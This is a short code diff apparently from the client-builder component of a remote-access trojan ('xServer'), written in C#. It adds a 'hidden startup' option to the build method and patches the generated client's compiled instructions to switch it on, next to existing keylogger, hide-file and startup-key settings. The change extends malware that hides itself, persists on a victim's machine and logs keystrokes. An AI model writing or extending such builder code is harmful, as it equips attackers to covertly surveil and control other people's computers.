@@ -37,7 +37,7 @@ namespace xServer.Core.Build
         /// <exception cref="System.ArgumentException">Thrown if an invalid special folder was specified.</exception>
         /// <exception cref="System.IO.FileLoadException">Thrown if the client binaries do not exist.</exception>
         public static void Build(string output, string tag, string host, string password, string installsub, string installname,
-            string mutex, string startupkey, bool install, bool startup, bool hidefile, bool keylogger,
+            string mutex, string startupkey, bool install, bool hiddenstartup, bool startup, bool hidefile, bool keylogger,
             int reconnectdelay,
             int installpath, string iconpath, string[] asminfo, string version)
         {
@@ -115,6 +115,9 @@ namespace xServer.Core.Build
                                             break;
                                         case 4: //Keylogger
                                             methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(keylogger));
+                                            break;
+                                        case 5: //HiddenStartup
+                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(hiddenstartup));
                                             break;
                                     }
                                     bools++;
